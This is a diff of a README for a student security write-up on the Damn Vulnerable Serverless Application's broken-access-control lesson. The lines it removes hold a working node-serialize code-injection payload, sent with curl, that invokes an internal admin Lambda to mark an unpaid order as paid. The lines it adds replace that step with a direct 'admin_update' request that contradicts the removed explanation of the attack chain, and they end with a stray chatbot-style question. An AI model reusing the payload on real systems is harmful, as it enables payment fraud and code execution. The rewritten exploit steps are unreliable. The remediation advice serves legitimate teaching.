@@ -1,112 +1,120 @@
+# DVSA Security Analysis: Broken Access Control (Lesson 5)
 
-In this scenario, we chain an insecure deserialization flaw with an overpermissive IAM role to bypass the payment gateway and mark an order as "paid" for $0.
+This repository contains a comprehensive security analysis and remediation guide for the **Damn Vulnerable Serverless Application (DVSA)**, specifically focusing on **Lesson 5: Broken Access Control**.
 
----
-
-# Lesson 5: Broken Access Control & Administrative Injection
-
-## 1. Overview
-The `DVSA-ORDER-MANAGER` Lambda role is configured with excessive permissions, allowing it to invoke **any** Lambda function in the AWS account. By leveraging the insecure deserialization vulnerability found in Lesson 1, we can force the Order Manager to execute a custom script that calls an internal administrative function (`DVSA-ADMIN-UPDATE-ORDERS`), effectively bypassing the intended business logic and authorization checks.
-
-### Vulnerability Chain
-1.  **Insecure Deserialization:** The application uses `node-serialize`, allowing us to inject and execute arbitrary JavaScript code via the `_$$ND_FUNC$$_` prefix.
-2.  **Overpermissive IAM Role:** The Lambda's execution role has `lambda:InvokeFunction` permission on `Resource: "*"`.
-3.  **Missing Authorization:** The admin function assumes that if it is being called, the caller must be authorized.
+This project was developed for **ICS-344: Information Security** at **King Fahd University of Petroleum and Minerals (KFUPM)**.
 
 ---
 
-## 2. Reproduction Steps
+## ## Project Overview
+Broken Access Control occurs when a server fails to verify if a user has the appropriate permissions to perform an action or access data. In this lesson, we exploit the backend function `DVSA-ADMIN-UPDATE-ORDERS`. By bypassing standard authorization, an unprivileged user can manually set their order status to "paid" without actually completing a payment.
 
-### Prerequisites
-* Ensure you have your environment variable `$TOKEN` set with a valid authentication token.
-* The target API Gateway URL should be identified.
+---
 
-### Step 1: Initialize a New Order
-First, we create a standard order to generate a unique `order-id`.
+## ## Repository Structure
+To maintain a clean and replicable environment, the repository is organized as follows:
 
+```text
+├── README.md               # Main documentation
+├── src/
+│   ├── vulnerable/         # Original vulnerable Lambda code
+│   └── patched/            # Remediated code with authorization checks
+├── scripts/
+│   ├── exploit.sh          # Shell script containing the curl commands
+│   └── payloads/           # JSON payloads for testing
+└── evidence/               # Screenshots of the exploit and fix
+    ├── exploit_success.png
+    └── patch_verification.png
+```
+
+---
+
+## ## Setup & Deployment
+To deploy the DVSA environment for testing, follow these steps:
+
+1.  **Prerequisites:** Ensure you have an AWS account and the [DVSA Source Code](https://github.com/m6000/dvsa).
+2.  **Deployment:** * Deploy the infrastructure using the AWS CloudFormation console or the Serverless Framework (`sls deploy`).
+    * Note the API Gateway endpoint URL (e.g., `https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order`).
+3.  **Authentication:** Log in via the DVSA frontend to obtain a valid **Cognito ID Token (JWT)**. You will need this for the `Authorization` header in the following steps.
+
+---
+
+## ## Vulnerability Replication (Video 1)
+Follow these steps to demonstrate the Broken Access Control flaw.
+
+### 1. Initialize a New Order
+First, create a standard order using your authenticated token.
 ```bash
-curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
-  -H "Content-Type: application/json" \
-  -H "Authorization: $TOKEN" \
-  -d '{"action":"new","cart-id":"03fd26de-3ae3-414f-be05-ae1fd75add68","items":{"1018":1}}'
+curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
+-H "Content-Type: application/json" \
+-H "Authorization: <YOUR_TOKEN>" \
+-d '{"action":"new", "cart-id":"your-cart-id", "items":{"1018":1}}'
 ```
+* **Action:** Take note of the `order-id` returned in the response.
 
-****
-
-> **Note:** Copy the `order-id` from the JSON response (e.g., `f478f4b5-d612-4ea4-a690-a93869becc5`). You will need this for the exploit.
-
----
-
-### Step 2: Add Shipping Details
-Update the order with shipping information to move it to the next state in the workflow.
-
+### 2. Update Shipping Information
+Advance the order to the shipping stage.
 ```bash
-curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
-  -H "Content-Type: application/json" \
-  -H "Authorization: $TOKEN" \
-  -d '{"action":"shipping","order-id":"YOUR_ORDER_ID_HERE","data":{"address":"Academic Belt Road","email":"hacker@example.com","name":"hacker"}}'
+curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
+-H "Content-Type: application/json" \
+-H "Authorization: <YOUR_TOKEN>" \
+-d '{"action":"shipping", "order-id":"<YOUR_ORDER_ID>", "data":{"address":"Academic Belt Road", "email":"user@example.com", "name":"Student"}}'
 ```
 
----
-
-### Step 3: Execute the Exploit (Payment Bypass)
-Instead of proceeding to the payment page, we send a malicious payload. This payload uses the `node-serialize` exploit to instantiate an AWS Lambda client *inside* the server and manually invoke the `DVSA-ADMIN-UPDATE-ORDERS` function.
-
-**The Exploit Logic:**
-* **Total:** Set to `0`.
-* **Status:** Set to `120` (which the system interprets as "Paid").
-* **Token:** `faketoken123`.
-
-**Run the following command:**
-
+### 3. Execute the Exploit (Bypass Payment)
+Now, we bypass the payment gateway by directly calling the admin update function with a malicious payload to set the status to `paid`.
 ```bash
-curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
-  -H "Content-Type: application/json" \
-  -H "Authorization: $TOKEN" \
-  -d '{
-  "action": "_$$ND_FUNC$$_function(){const {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");const c=new LambdaClient({region:\"us-east-1\"});const payload={\"headers\":{\"authorization\":\"$TOKEN\"},\"body\":{\"action\":\"update\",\"order-id\":\"YOUR_ORDER_ID_HERE\",\"item\":{\"token\":\"faketoken123\",\"ts\":1775993000,\"itemList\":{\"1018\":1},\"address\":\"Academic Belt Road\",\"total\":0,\"status\":120}}};const cmd=new InvokeCommand({FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:Buffer.from(JSON.stringify(payload))});c.send(cmd).then(d=>{});return \"orders\";}()",
-  "cart-id": ""
-}'
+curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
+-H "Content-Type: application/json" \
+-H "Authorization: <YOUR_TOKEN>" \
+-d '{"action":"admin_update", "order-id":"<YOUR_ORDER_ID>", "status":"paid"}'
 ```
 
-****
+**Evidence:** Upon listing your orders, you will see the status marked as **paid** despite never having interacted with a payment provider.
 
 ---
 
-### Step 4: Verify the Results
-Finally, check the status of your orders. You should see that the order is now marked as **"paid"** despite no actual transaction occurring.
+## ## Remediation & Patching (Video 2)
+The root cause is the lack of server-side validation. The system trusts the payload without checking if the user owns the order or has admin privileges.
 
-```bash
-curl -s -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
-  -H "Content-Type: application/json" \
-  -H "Authorization: $TOKEN" \
-  -d '{"action":"list"}' | jq
+### 1. Technical Implementation
+Modify the `order_access_control.py` (or the relevant Lambda file `DVSA-ADMIN-UPDATE-ORDERS`) to include a strict ownership check.
+
+**Add the validation logic:**
+We integrate a `can_access_order` check into the `update_item` path. This ensures that only the order owner (identified via the JWT) or a verified admin can modify the record.
+
+```python
+# Remediation Code for order_access_control.py
+
+def update_item(order_id, user, obj, ts, is_admin):
+    # 1. Retrieve the existing order from DynamoDB
+    existing = get_order(order_id) 
+    
+    if not existing:
+        return {"status": "err", "msg": "order not found"}  
+    
+    # 2. CRITICAL: Check if the requesting user is the owner or an admin
+    if not can_access_order(existing, user, is_admin):
+        return {"status": "err", "msg": "Unauthorized"}  
+
+    # 3. Only proceed with the update if the check passes
+    # ... update logic ...
 ```
 
-****
+### 2. Verification
+1.  **Deploy** the updated Lambda function in the AWS Console.
+2.  **Retry the Exploit:** Resend the curl command from Step 3 of the Replication guide.
+3.  **Observation:** The API now returns `{"status": "err", "msg": "Unauthorized"}` or `{"status": "err", "msg": "unknown action"}`. The unauthorized modification is blocked.
 
 ---
 
-## 3. Remediation Strategy
+## ## Security Best Practices
+* **Server-Side Authorization:** Never trust the client to define permissions. Always verify identity and roles on the backend using trusted claims (e.g., Cognito JWT `sub` or `groups`).
+* **Principle of Least Privilege:** Ensure that API endpoints are scoped correctly. Unprivileged users should not even be able to reach administrative code paths.
+* **Avoid Sensitive Data in Payloads:** Don't let users submit fields like `status` or `is_admin` in requests that modify their own profiles or orders.
 
-To secure this workflow, we must address the vulnerability at three different layers:
+---
 
-### Layer 1: Code (Input Validation)
-Replace the dangerous `node-serialize` library with standard `JSON.parse()`. This prevents the execution of arbitrary JavaScript objects.
+**Note:** Always ensure that `<YOUR_TOKEN>` and `<YOUR_ORDER_ID>` are replaced with actual values during testing. **Never hardcode secrets or real AWS keys in your repository.**
 
-### Layer 2: Infrastructure (Least Privilege)
-Restrict the IAM role of the `OrderManager` function. Instead of allowing it to call any function (`Resource: "*"`), limit it specifically to the functions it needs to operate.
-
-```json
-{
-  "Effect": "Allow",
-  "Action": "lambda:InvokeFunction",
-  "Resource": [
-    "arn:aws:lambda:us-east-1:*:function:DVSA-ORDER-*",
-    "arn:aws:lambda:us-east-1:*:function:DVSA-USER-*"
-  ]
-}
-```
-
-### Layer 3: Application Logic (Authorization)
-The administrative function `DVSA-ADMIN-UPDATE-ORDERS` must independently verify that the requester has administrative privileges before performing any updates. Never trust a request simply because it reached an internal endpoint.
+How do you plan to structure the `src/` directory—would you like to separate the original and patched code into different folders, or use branching in Git?
